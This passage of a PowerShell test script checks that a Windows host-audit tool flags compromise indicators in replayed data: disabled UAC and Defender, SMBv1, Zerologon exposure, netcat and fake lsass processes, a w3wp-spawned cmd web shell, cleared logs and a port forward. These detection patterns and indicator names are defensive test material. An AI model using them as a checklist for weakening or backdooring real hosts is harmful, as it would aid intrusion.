T-Has $sum 'Scheduled tasks: 4 (3 outside \Microsoft\)' 'task count'
# security
T-Has $fl '"HIGH","security","WDigest UseLogonCredential"' 'WDigest on'
T-Has $fl '"HIGH","security","UAC EnableLUA"' 'UAC off'
T-Has $fl '"MED","security","LocalAccountTokenFilterPolicy"' 'remote UAC off'
T-Has $fl '"MED","security","LmCompatibilityLevel"' 'NTLMv1 allowed'
T-Has $fl '"MED","security","RestrictAnonymousSAM"' 'anonymous account listing'
T-Has $fl '"MED","security","SMBv1 server","SMBv1 server = True (registry)' 'SMBv1 on'
T-Has $fl '"MED","security","SMB server signing required"' 'signing off on a DC is MED'
T-Has $fl '"MED","security","RDP Network Level Authentication"' 'RDP without NLA'
T-Has $fl '"HIGH","security","AlwaysInstallElevated"' 'AlwaysInstallElevated'
T-Has $fl '"HIGH","security","Winlogon stored password"' 'stored logon password'
T-Has $fl '"HIGH","security","portproxy 0.0.0.0/8443","this box forwards 0.0.0.0/8443 to 10.6.6.6/443"' 'port forward'
T-Has $fl '"HIGH","security","Zerologon FullSecureChannelProtection"' 'Zerologon enforcement off'
T-Has $fl '"MED","security","audit policy"' 'audit policy cleared'
T-Has $fl '"MED","security","audit Logon"' 'logons not audited'
# firewall
T-Has $fl '"HIGH","firewall","firewall Domain","the Domain firewall profile is OFF"' 'profile off'
T-Has $fl '"HIGH","firewall","firewall Private","the Private profile allows all inbound traffic by default"' 'allow-inbound default'
T-Has $fl '"HIGH","firewall","Allow All","enabled inbound rule (local) allows every port' 'allow-all rule'
T-Has $fl '"HIGH","firewall","GPO allow all","enabled inbound rule (policy) allows every port' 'allow-all rule from Group Policy'
T-Has $fl '"HIGH","firewall","backdoor","inbound allow rule for an unusual program' 'rule for nc in Windows\Temp'
T-HasNot $fl 'svchost.exe rule' 'normal RDP rule not flagged'
T-HasNot $fl 'Microsoft.LockApp' 'a rule limited to one app package is not allow-all'
T-HasNot $fl 'Tailscale-In' 'a rule limited to one local address is not allow-all'
T-HasNot $fl 'Old allow all' 'a disabled rule is not flagged'
T-Has $fl '"LOW","firewall","Discord"' 'a rule for a program in AppData is LOW'
$fr = [IO.File]::ReadAllText((Join-Path $r.Dir 'firewall_rules.csv'))
T-Has $fr '"Microsoft.LockApp","local","True","Allow","","","","","","AppPkgId PFN"' 'package rules are shortened and show what limits them'
# defender
T-Has $fl '"HIGH","defender","Defender","real-time protection is off"' 'real-time off'
T-Has $fl '"HIGH","defender","Defender","DisableAntiSpyware = 1' 'policy turning Defender off'
T-Has $fl '"HIGH","defender","exclusion C:\"' 'whole-drive exclusion HIGH'
T-Has $fl '"MED","defender","exclusion D:\SQLData"' 'specific folder exclusion MED'
T-Has $fl '"HIGH","defender","exclusion ps1"' 'script extension exclusion HIGH'
T-Eq ([regex]::Matches($fl, 'exclusion D:\\SQLData"').Count) 1 'an exclusion seen in the registry and the cmdlet is listed once'
# processes
T-Has $fl '"HIGH","processes","lsass.exe","2 processes named lsass.exe' 'two lsass'
T-Has $fl '"HIGH","processes","lsass.exe (641)","system program name running from the wrong folder' 'fake lsass'
T-Has $fl '"HIGH","processes","svchost.exe (3700)"' 'fake svchost in ProgramData'
T-HasNot $fl '"svchost.exe (1200)"' 'real svchost not flagged'
T-Has $fl '"HIGH","processes","nc.exe (3300)"' 'netcat running'
T-Has $fl '"HIGH","processes","powershell.exe (3500)","suspicious command line' 'encoded powershell'
T-Has $fl '"HIGH","processes","cmd.exe (3600)","cmd.exe was started by w3wp.exe' 'web shell'
# shares, software, updates, events, drivers, rights, roles
T-Has $fl '"MED","shares","Public","\Everyone has Full access to share Public"' 'Everyone full on a share'
T-HasNot $fl '"shares","NETLOGON"' 'default shares not flagged'
T-Has $fl '"MED","software","AnyDesk"' 'remote-access tool'
T-Has $fl '"HIGH","updates","updates","newest update is from 2020-05-20: this DC is probably open to Zerologon"' 'unpatched DC'
T-Has $fl '"HIGH","events","2026-11-11 09:10:00 Security log cleared"' 'log cleared'
T-Has $fl '"MED","events","2026-11-11 09:01:00 added to a local group","added to a local group: Account Name=jsmith; Group Name=Administrators"' 'admin added'
T-Has $fl '"HIGH","events","2026-11-11 09:02:00 service installed"' 'suspicious service install is HIGH'
T-Has $fl '"LOW","events","2026-11-11 09:03:00 service installed"' 'ordinary service install (an update) is LOW'
T-Has $fl '"HIGH","drivers","evil"' 'driver from Users\Public'
T-HasNot $fl '"drivers","disk"' 'normal driver not flagged'
T-Has $fl '"MED","rights","SeDebugPrivilege *S-1-5-21-1-2-3-1106"' 'debug right for a user'
T-HasNot $fl 'SeImpersonatePrivilege' 'default impersonate holders not flagged'
T-Has $fl '"HIGH","rights","SeRemoteInteractiveLogonRight *S-1-1-0"' 'RDP logon for Everyone'
T-Has $sum 'Runs: Domain controller, DNS server, Remote Desktop' 'roles from services'
T-True (Test-Path -LiteralPath (Join-Path $r.Dir 'raw\registry.csv')) 'the replayed raw files are kept with the new run'
T-True (Test-Path -LiteralPath (Join-Path $r.Dir 'tasks.csv')) 'section CSV written'
T-HasNot ([IO.File]::ReadAllText((Join-Path $r.Dir 'users.csv'))) 'Summer2026' 'the password-like description is not in users.csv'
T-Has ([IO.File]::ReadAllText((Join-Path $r.Dir 'users.csv'))) '(hidden: password-like text)' 'it is replaced by a note'

T-Start 'replay of a clean workstation'
$r = Run @('-Out', $out, '-FromRaw', $good)
T-Eq $r.Code 0 'exits 0'
$fl = Flags $r.Dir
T-HasNot $fl '"HIGH"' 'no HIGH flags on a clean host'
T-HasNot $fl '"MED"' 'no MED flags on a clean host'
T-HasNot $fl 'SMBv1' 'SMBv1 off per the SMB server settings'
T-HasNot $fl '"updates"' 'recent updates not flagged'
$sum = [IO.File]::ReadAllText((Join-Path $r.Dir 'summary.txt'))
T-Has $sum 'Flags: 0 high, 0 medium' 'summary counts'
T-Has $sum 'not in the replay folder' 'missing sources are noted per section'

T-Start 'profiles and -Only'
$r = Run @('-Out', $out, '-FromRaw', $bad, '-Profile', 'card')
$sum = [IO.File]::ReadAllText((Join-Path $r.Dir 'summary.txt'))
T-Has $sum 'defender' 'card runs defender'; T-HasNot $sum 'drivers ' 'card skips drivers'
$r = Run @('-Out', $out, '-FromRaw', $bad, '-Only', 'users', '-Quiet')
$sum = [IO.File]::ReadAllText((Join-Path $r.Dir 'summary.txt'))
T-HasNot $sum 'services ' '-Only runs just that section'
T-HasNot $r.Text 'Sections:' '-Quiet keeps the summary off the screen'

T-Start 'live run on this machine (sources missing on non-Windows)'
$r = Run @('-Out', $out, '-Profile', 'card')
T-Eq $r.Code 0 'exits 0 even when nothing Windows-specific exists'
T-True ($r.Dir -ne '' -and (Test-Path -LiteralPath (Join-Path $r.Dir 'summary.txt'))) 'still writes the summary'
if ([Environment]::OSVersion.Platform -ne 'Win32NT') {
    T-Has ([IO.File]::ReadAllText((Join-Path $r.Dir 'summary.txt'))) 'could not be read' 'the summary says which sources failed'
}

Remove-Item -LiteralPath $tmp -Recurse -Force -ErrorAction SilentlyContinue
Write-Host ("  {0} passed, {1} failed" -f $script:pass, $script:fail)
if ($script:fail -gt 0) { exit 1 }
exit 0
